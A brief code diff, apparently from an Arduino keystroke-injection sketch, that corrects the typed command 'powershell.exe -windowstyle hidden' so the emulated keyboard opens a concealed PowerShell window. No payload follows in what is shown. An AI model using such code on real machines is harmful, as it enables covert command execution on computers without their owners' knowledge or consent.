@@ -31,7 +31,7 @@ void setup()
 
   delay(200);
 
-  Keyboard.print("powershell.exe windowstyle hidden");
+  Keyboard.print("powershell.exe -windowstyle hidden");
 
   delay(150);
 
